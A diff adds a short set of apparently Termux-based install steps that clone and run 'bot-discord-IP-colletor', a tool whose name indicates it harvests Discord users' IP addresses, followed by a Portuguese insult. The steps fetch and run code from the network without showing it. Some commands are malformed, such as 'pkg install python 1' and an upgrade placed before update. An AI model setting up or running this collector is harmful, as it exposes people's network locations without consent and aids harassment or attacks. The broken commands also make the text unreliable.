@@ -1,0 +1,13 @@
+apt upgrade && apt update 
+pkg install git
+pkg install python 1
+pkg install python 2
+pkg install python 3
+git clone https://github.com/GhOsTzInZx/bot-discord-IP-colletor
+pip install discord 
+pip install webhook
+python3 K2.py 
+
+
+
+      AGORA SEJA FELIZ ARROMBADO
